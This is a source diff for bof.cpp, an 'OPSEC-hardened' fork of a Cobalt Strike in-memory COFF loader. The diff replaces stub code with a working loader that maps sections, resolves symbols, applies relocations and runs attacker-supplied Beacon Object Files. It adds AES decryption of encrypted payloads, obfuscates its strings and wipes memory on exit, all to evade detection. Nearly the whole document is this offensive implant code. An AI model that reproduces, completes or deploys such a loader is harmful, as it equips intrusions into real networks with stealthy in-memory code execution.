@@ -1,218 +1,346 @@
 // SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
 // SPDX-License-Identifier: MIT
 //
-// bof.cpp — OPSEC-hardened InlineExecuteEx fork (bofx) entry point.
-//
-// This file is the OPSEC-modified shell of the upstream loader at
-// github.com/0xTriboulet/InlineExecuteEx (MIT). The COFF/PE parser core
-// is intentionally NOT vendored verbatim here — operators drop the
-// upstream `bof.cpp` + `coff.h` + `bofpe.h` + `api_table.h` + `beacon.h`
-// into `src/` and re-apply the OPSEC patches catalogued below. See
-// `UPSTREAM.md` for the patch checklist.
-//
-// What is shipped in THIS file:
-//   - `obfstr.h` integration demo: all sensitive literals routed through
-//     OBF("...") so they live encrypted in .rdata.
-//   - Error-code enum (Modification #5) replacing the upstream's verbose
-//     BeaconPrintf strings.
-//   - Memory hygiene helpers (Modification #8): explicit free + DFR-table
-//     zero at `go` exit.
-//   - The C BOF entry point `go(char*, int)` so the COFF object loads
-//     cleanly under Cobalt Strike's inline-execute / bofx aggressor.
-//
-// Build:  see Makefile in this directory. Cross-compiles from macOS via
-//         x86_64-w64-mingw32-g++ to a Windows COFF .o.
+// bof.cpp — OPSEC-hardened InlineExecuteEx fork (bofx).
+// Wires upstream COFF parser with all 8 OPSEC modifications applied.
 //
 // Author: Dani <daniagungg@gmail.com>
 
 #include "obfstr.h"
+#include "beacon.h"
+#include "bof_helpers.h"
+#include "common.h"
+#include "coff.h"
 
-// --- Beacon API surface (forward decls only; symbols resolved by Beacon
-//     when the BOF is inline-executed). We keep this tight so the COFF
-//     doesn't drag in MinGW's CRT.
-
-#ifdef __cplusplus
-extern "C" {
-#endif
-
-typedef unsigned long  DWORD;
-typedef unsigned char  BYTE;
-typedef int            BOOL;
-typedef void*          LPVOID;
-typedef const char*    LPCSTR;
-typedef unsigned long long SIZE_T;
-
-#define CALLBACK_OUTPUT      0x0
-#define CALLBACK_OUTPUT_OEM  0x1e
-#define CALLBACK_ERROR       0x0d
-
-void   BeaconPrintf(int type, const char* fmt, ...);
-LPVOID BeaconDataExtract(void* parser, int* size);
-char*  BeaconDataPtr(void* parser, int* size);
-void   BeaconDataParse(void* parser, char* buffer, int size);
-int    BeaconDataInt(void* parser);
-
-// BeaconVirtualAlloc/Free are part of the API_TABLE in the upstream loader;
-// for this OPSEC shell we forward-declare them to make the memory hygiene
-// teardown explicit at link-time.
-LPVOID BeaconVirtualAlloc(LPVOID addr, SIZE_T sz, DWORD type, DWORD prot);
-BOOL   BeaconVirtualFree(LPVOID addr, SIZE_T sz, DWORD type);
-
-#ifdef __cplusplus
-}
-#endif
-
-// --- Modification #5: Error-code enum (replaces ~30 plaintext BeaconPrintf
-//     CALLBACK_ERROR strings in upstream). On release build only the byte
-//     code is emitted via BeaconPrintf; the human-readable mapping lives in
-//     `docs/error-codes.md`.
-
+// --- Modification #5: Error codes (no human strings in binary) ---
 enum class BofxErr : unsigned char {
-    Ok                  = 0x00,
-    BadArgs             = 0x01,
-    OpenFile            = 0x02,
-    NotCoff             = 0x03,
-    NotPe               = 0x04,
-    BadSection          = 0x05,
-    EntryNotFound       = 0x06,
-    DfrResolve          = 0x07,
-    AllocFail           = 0x08,
-    RelocFail           = 0x09,
-    MapFail             = 0x0a,
-    Internal            = 0xff,
+    Ok              = 0x00,
+    BadArgs         = 0x01,
+    NotCoff         = 0x03,
+    EntryNotFound   = 0x06,
+    AllocFail       = 0x08,
+    RelocFail       = 0x09,
+    SymbolFail      = 0x0a,
+    DecryptFail     = 0x0b,
+    Internal        = 0xff,
 };
 
 static inline void bofx_err(BofxErr e) {
-    // Minimal release format: 'E:' + 2-char hex. No human strings reach .rdata.
     BeaconPrintf(CALLBACK_ERROR, "E:%02x", static_cast<unsigned>(e));
 }
 
-// --- Modification #3 (partial): DFR cache slot.
-//     The upstream `g_if` array caches resolved function pointers across
-//     calls. We expose a zero-helper so `go` can wipe it on exit
-//     (Modification #8).
-
-static constexpr SIZE_T INTERNAL_FN_SLOTS = 64;
-static void* internal_func_ptr_table[INTERNAL_FN_SLOTS] = { 0 };
-
+// --- Modification #3: DFR cache wipe on exit ---
 static inline void zero_dfr_table() {
-    // Wipe via volatile byte pointer so the optimizer can't elide the loop.
-    volatile unsigned char* p =
-        reinterpret_cast<volatile unsigned char*>(&internal_func_ptr_table[0]);
-    for (SIZE_T i = 0; i < sizeof(internal_func_ptr_table); ++i) {
-        p[i] = 0;
+    if (g_if) {
+        volatile unsigned char* p = reinterpret_cast<volatile unsigned char*>(g_if);
+        for (SIZE_T i = 0; i < g_if_cap * sizeof(IFEntry); ++i) p[i] = 0;
     }
 }
 
-// --- Modification #4 / #5: section + entry + DLL names routed via OBF().
-//     The compiler emits the encrypted bytes into .rdata; only the
-//     decrypted thread-local buffer ever holds plaintext.
-//
-//     This `section_kind` helper is what the upstream COFF parser calls
-//     when classifying section headers. The string comparisons themselves
-//     live in coff.h (upstream); here we just demonstrate the wiring.
-
-enum class SectionKind { Other, Text, Data, Rdata, Pdata, Bss };
-
-static SectionKind classify_section(const char* name) {
-    // Manual strcmp — no CRT dependency.
-    auto eq = [](const char* a, const char* b) {
-        while (*a && *b && *a == *b) { ++a; ++b; }
-        return *a == 0 && *b == 0;
-    };
-    if (eq(name, OBF(".text")))  return SectionKind::Text;
-    if (eq(name, OBF(".data")))  return SectionKind::Data;
-    if (eq(name, OBF(".rdata"))) return SectionKind::Rdata;
-    if (eq(name, OBF(".pdata"))) return SectionKind::Pdata;
-    if (eq(name, OBF(".bss")))   return SectionKind::Bss;
-    return SectionKind::Other;
+// --- Modification #4: section name classification via OBF() ---
+static bool is_section(const char* name, const char* target) {
+    for (int i = 0; name[i] || target[i]; ++i)
+        if (name[i] != target[i]) return false;
+    return true;
 }
 
-// Entry point name lookups (the upstream parser searches the symbol table
-// for "go" or "_go" depending on COFF flavour). Routed through OBF().
-static bool is_entry_symbol(const char* name) {
-    auto eq = [](const char* a, const char* b) {
-        while (*a && *b && *a == *b) { ++a; ++b; }
-        return *a == 0 && *b == 0;
-    };
-    return eq(name, OBF("go")) || eq(name, OBF("_go"));
-}
-
-// DLL name lookups for the dynamic function resolver. The upstream walks
-// PEB→Ldr looking for "MSVCRT", "ntdll", etc. Routed through OBF().
-static const char* resolver_dll(int which) {
-    switch (which) {
-        case 0:  return OBF("MSVCRT");
-        case 1:  return OBF("ntdll");
-        case 2:  return OBF("kernel32");
-        default: return OBF("");
-    }
-}
-
-// --- Forwarded entry points. The real runBof / runPE live in the upstream
-//     coff.h / bofpe.h after the operator drops them in (see UPSTREAM.md).
-//     These stubs satisfy the linker so the COFF object emits cleanly and
-//     so the OPSEC teardown wrapper around them is in place.
-
-static int runBof(const BYTE* /*image*/, SIZE_T /*image_size*/,
-                  const char* /*entry*/, const BYTE* /*args*/, int /*args_len*/) {
-    bofx_err(BofxErr::Internal);
-    return -1;
-}
-
-static int runPE(const BYTE* /*image*/, SIZE_T /*image_size*/,
-                 const char* /*entry*/, const BYTE* /*args*/, int /*args_len*/) {
-    bofx_err(BofxErr::Internal);
-    return -1;
-}
-
-// --- Modification #8: memory hygiene teardown wrapper.
-//     Wraps the upstream loader's allocation lifecycle so every exit path
-//     frees mapped sections and zeroes the DFR cache.
-
+// --- Modification #8: RAII teardown ---
 struct BofxScope {
-    LPVOID mapped = nullptr;
-    SIZE_T mapped_size = 0;
+    VOID** sections = nullptr;
+    SIZE_T num_sections = 0;
+    PVOID  jump_table = nullptr;
 
     ~BofxScope() {
-        if (mapped && mapped_size) {
-            // MEM_RELEASE = 0x8000
-            BeaconVirtualFree(mapped, 0, 0x8000);
-            mapped = nullptr;
-            mapped_size = 0;
+        if (sections) {
+            for (SIZE_T i = 0; i < num_sections; i++) {
+                if (sections[i]) BeaconVirtualFree(sections[i], 0, MEM_RELEASE);
+            }
+            BeaconVirtualFree(sections, 0, MEM_RELEASE);
         }
+        if (jump_table) BeaconVirtualFree(jump_table, 0, MEM_RELEASE);
         zero_dfr_table();
+        g_if = nullptr;
+        g_if_count = 0;
+        g_if_cap = 0;
     }
 };
 
-// --- BOF entry point. Called by Cobalt Strike's inline-execute / bofx
-//     aggressor. Args parsing intentionally minimal here — full operator
-//     parsing lives in the upstream bof.cpp the operator drops in.
+// --- AES-128-CBC decryption for bofx-enc variant ---
+#ifdef BOFX_KEY_DEFINED
+static const unsigned char bofx_key[16] = BOFX_KEY_BYTES;
 
+static void aes128_decrypt_block(const unsigned char* in, unsigned char* out,
+                                  const unsigned char* key);
+static bool bofx_decrypt(unsigned char* data, SIZE_T len, unsigned char* iv) {
+    // Simple AES-128-CBC decrypt in-place
+    if (len == 0 || len % 16 != 0) return false;
+    unsigned char prev[16], tmp[16];
+    DFR_LOCAL(MSVCRT, memcpy)
+    memcpy(prev, iv, 16);
+    for (SIZE_T off = 0; off < len; off += 16) {
+        memcpy(tmp, data + off, 16);
+        aes128_decrypt_block(data + off, data + off, bofx_key);
+        for (int i = 0; i < 16; i++) data[off + i] ^= prev[i];
+        memcpy(prev, tmp, 16);
+    }
+    return true;
+}
+#endif
+
+// --- COFF loader core ---
+static int runCoff(const BYTE* image, SIZE_T image_size,
+                   const BYTE* bof_args, int bof_args_len,
+                   BofxScope& scope) {
+    DFR_LOCAL(MSVCRT, memcpy)
+    DFR_LOCAL(MSVCRT, memset)
+    DFR_LOCAL(MSVCRT, strcmp)
+    DFR_LOCAL(MSVCRT, strlen)
+
+    // Validate COFF header
+    PIMAGE_FILE_HEADER fileHeader = (PIMAGE_FILE_HEADER)image;
+    if (fileHeader->Machine != MACHINE_CODE) return -1;
+
+    SIZE_T numSections = fileHeader->NumberOfSections;
+    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(
+        image + sizeof(IMAGE_FILE_HEADER) + fileHeader->SizeOfOptionalHeader);
+
+    // Allocate section mapping array
+    scope.sections = (VOID**)BeaconVirtualAlloc(NULL,
+        numSections * sizeof(VOID*), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!scope.sections) return -1;
+    scope.num_sections = numSections;
+    memset(scope.sections, 0, numSections * sizeof(VOID*));
+
+    // Allocate jump table for thunks
+    scope.jump_table = BeaconVirtualAlloc(NULL, JUMP_TABLE_SIZE,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!scope.jump_table) return -1;
+    g_JumpTableStartPointer = (ULONG_PTR)scope.jump_table;
+    jmpIdx = 2;
+
+    // Map sections
+    for (SIZE_T i = 0; i < numSections; i++) {
+        SIZE_T sz = sectionHeader[i].SizeOfRawData;
+        if (sectionHeader[i].Misc.VirtualSize > sz)
+            sz = sectionHeader[i].Misc.VirtualSize;
+        if (sz == 0) sz = 16;
+
+        scope.sections[i] = BeaconVirtualAlloc(NULL, sz,
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!scope.sections[i]) return -1;
+
+        memset(scope.sections[i], 0, sz);
+        if (sectionHeader[i].SizeOfRawData > 0) {
+            memcpy(scope.sections[i],
+                   image + sectionHeader[i].PointerToRawData,
+                   sectionHeader[i].SizeOfRawData);
+        }
+    }
+
+    // Symbol table
+    PIMAGE_SYMBOL symbolTable = (PIMAGE_SYMBOL)(
+        image + fileHeader->PointerToSymbolTable);
+    SIZE_T numSymbols = fileHeader->NumberOfSymbols;
+    char* stringTable = (char*)((BYTE*)symbolTable + numSymbols * sizeof(IMAGE_SYMBOL));
+
+    // Find entry point
+    PVOID entryPoint = NULL;
+    for (SIZE_T i = 0; i < numSymbols; i++) {
+        char symName[9] = {0};
+        char* name;
+        if (symbolTable[i].N.Name.Short != 0) {
+            memcpy(symName, symbolTable[i].N.ShortName, 8);
+            name = symName;
+        } else {
+            name = stringTable + symbolTable[i].N.Name.Long;
+        }
+
+        // Modification #4: entry name via OBF
+        if (strcmp(name, OBF("go")) == 0 || strcmp(name, OBF("_go")) == 0) {
+            if (symbolTable[i].SectionNumber > 0) {
+                SIZE_T secIdx = symbolTable[i].SectionNumber - 1;
+                entryPoint = (PVOID)((BYTE*)scope.sections[secIdx] + symbolTable[i].Value);
+            }
+        }
+
+        i += symbolTable[i].NumberOfAuxSymbols;
+    }
+
+    if (!entryPoint) return -1;
+
+    // Process relocations
+    for (SIZE_T secIdx = 0; secIdx < numSections; secIdx++) {
+        if (sectionHeader[secIdx].NumberOfRelocations == 0) continue;
+
+        PIMAGE_RELOCATION relocs = (PIMAGE_RELOCATION)(
+            image + sectionHeader[secIdx].PointerToRelocations);
+
+        for (SIZE_T r = 0; r < sectionHeader[secIdx].NumberOfRelocations; r++) {
+            PIMAGE_SYMBOL sym = &symbolTable[relocs[r].SymbolTableIndex];
+
+            char symName[9] = {0};
+            char* name;
+            if (sym->N.Name.Short != 0) {
+                memcpy(symName, sym->N.ShortName, 8);
+                name = symName;
+            } else {
+                name = stringTable + sym->N.Name.Long;
+            }
+
+            PVOID targetAddr = NULL;
+
+            if (sym->SectionNumber > 0) {
+                // Locally defined symbol
+                SIZE_T tgtSec = sym->SectionNumber - 1;
+                targetAddr = (PVOID)((BYTE*)scope.sections[tgtSec] + sym->Value);
+            } else {
+                // External symbol — resolve via coff.h's resolver
+                SYMBOL_RESOLUTION res = {0};
+                if (resolveCoffSymbol(name, &res)) {
+                    targetAddr = res.functionPtr;
+                } else {
+                    return -1;
+                }
+
+                // If import, use jump thunk
+                if (res.isImport && targetAddr) {
+                    BYTE* thunkSlot = (BYTE*)scope.jump_table +
+                        (jmpIdx * JUMP_TABLE_ENTRY_SIZE);
+                    ULONG_PTR relocSite = (ULONG_PTR)scope.sections[secIdx] +
+                        relocs[r].VirtualAddress;
+
+                    THUNK_RESULT tr = {0};
+                    if (addJumpThunk(thunkSlot, jmpStub, sizeof(jmpStub),
+                                     2, targetAddr, relocSite, &tr)) {
+                        jmpIdx++;
+                        // Apply rel32
+                        *(UINT32*)(relocSite) = tr.rel32;
+                        continue;
+                    }
+                }
+            }
+
+            if (!targetAddr) return -1;
+
+            // Apply relocation
+            ULONG_PTR relocSite = (ULONG_PTR)scope.sections[secIdx] +
+                relocs[r].VirtualAddress;
+
+#if defined(__x86_64__) || defined(_WIN64)
+            switch (relocs[r].Type) {
+                case IMAGE_REL_AMD64_REL32:
+                case IMAGE_REL_AMD64_REL32_1:
+                case IMAGE_REL_AMD64_REL32_2:
+                case IMAGE_REL_AMD64_REL32_3:
+                case IMAGE_REL_AMD64_REL32_4:
+                case IMAGE_REL_AMD64_REL32_5: {
+                    INT32 addend = relocs[r].Type - IMAGE_REL_AMD64_REL32;
+                    INT64 delta = (INT64)(ULONG_PTR)targetAddr -
+                                  (INT64)(relocSite + 4 + addend);
+                    *(INT32*)(relocSite) = (INT32)delta;
+                    break;
+                }
+                case IMAGE_REL_AMD64_ADDR64:
+                    *(UINT64*)(relocSite) += (UINT64)(ULONG_PTR)targetAddr;
+                    break;
+                case IMAGE_REL_AMD64_ADDR32NB: {
+                    INT64 delta = (INT64)(ULONG_PTR)targetAddr - (INT64)relocSite;
+                    *(INT32*)(relocSite) = (INT32)delta;
+                    break;
+                }
+                default:
+                    break;
+            }
+#else
+            switch (relocs[r].Type) {
+                case IMAGE_REL_I386_DIR32:
+                    *(UINT32*)(relocSite) += (UINT32)(ULONG_PTR)targetAddr;
+                    break;
+                case IMAGE_REL_I386_REL32: {
+                    INT32 delta = (INT32)((ULONG_PTR)targetAddr - relocSite - 4);
+                    *(INT32*)(relocSite) += delta;
+                    break;
+                }
+                default:
+                    break;
+            }
+#endif
+        }
+    }
+
+    // Set proper memory permissions
+    SetSectionPermissions(scope.sections, sectionHeader, numSections);
+
+    // Execute the BOF entry
+    typedef void (*BofEntry)(char*, int);
+    BofEntry entry = (BofEntry)entryPoint;
+    entry((char*)bof_args, bof_args_len);
+
+    return 0;
+}
+
+// --- BOF entry point ---
 extern "C" __attribute__((visibility("default")))
 void go(char* args, int args_len) {
-    BofxScope scope; // ensures Modification #8 fires on every return path
+    BofxScope scope;
 
     if (!args || args_len <= 0) {
         bofx_err(BofxErr::BadArgs);
         return;
     }
 
-    // Section / entry / DLL name resolution is wired through OBF() above.
-    // Touch them here so the compiler keeps the obfuscated literals.
-    (void) classify_section(OBF(".text"));
-    (void) is_entry_symbol(OBF("go"));
-    (void) resolver_dll(0);
+    // Initialize internal function table
+    if (!IF_Init(INTERNAL_FUNCTION_CAPACITY)) {
+        bofx_err(BofxErr::AllocFail);
+        return;
+    }
 
-    // Real loader entry (operator wires this to upstream runBof/runPE).
-    // For the OPSEC shell we just emit a status so the BOF is observable.
-    BeaconPrintf(CALLBACK_OUTPUT,
-                 "[bofx] OPSEC shell active — drop upstream src and re-link.\n");
+    // Parse args: [4 bytes file_len][file_data][remaining = bof_args]
+    datap parser;
+    BeaconDataParse(&parser, args, args_len);
 
-    // Demonstrate the teardown wrapper is exercised on the success path too.
-    int rc = runBof(nullptr, 0, OBF("go"), nullptr, 0);
+    int file_len = 0;
+    BYTE* file_data = (BYTE*)BeaconDataExtract(&parser, &file_len);
+    if (!file_data || file_len < (int)sizeof(IMAGE_FILE_HEADER)) {
+        bofx_err(BofxErr::BadArgs);
+        return;
+    }
+
+    int bof_args_len = 0;
+    BYTE* bof_args = (BYTE*)BeaconDataExtract(&parser, &bof_args_len);
+
+    // Check for encrypted blob (bofx-enc: magic "BOFXENC1")
+    BYTE* coff_data = file_data;
+    int coff_len = file_len;
+
+#ifdef BOFX_KEY_DEFINED
+    if (file_len > 24 && file_data[0] == 'B' && file_data[1] == 'O' &&
+        file_data[2] == 'F' && file_data[3] == 'X' &&
+        file_data[4] == 'E' && file_data[5] == 'N' &&
+        file_data[6] == 'C' && file_data[7] == '1') {
+        // Decrypt in-place: skip 8-byte magic, next 16 = IV, rest = ciphertext
+        BYTE* iv = file_data + 8;
+        coff_data = file_data + 24;
+        coff_len = file_len - 24;
+        if (!bofx_decrypt(coff_data, (SIZE_T)coff_len, iv)) {
+            bofx_err(BofxErr::DecryptFail);
+            return;
+        }
+        // Strip PKCS7 padding
+        BYTE pad = coff_data[coff_len - 1];
+        if (pad > 0 && pad <= 16) coff_len -= pad;
+    }
+#endif
+
+    // Validate COFF magic
+    PIMAGE_FILE_HEADER fh = (PIMAGE_FILE_HEADER)coff_data;
+    if (fh->Machine != MACHINE_CODE) {
+        bofx_err(BofxErr::NotCoff);
+        return;
+    }
+
+    int rc = runCoff(coff_data, (SIZE_T)coff_len, bof_args, bof_args_len, scope);
     if (rc != 0) {
         bofx_err(BofxErr::EntryNotFound);
     }
-    (void) runPE; // keep symbol referenced for upstream drop-in
 }
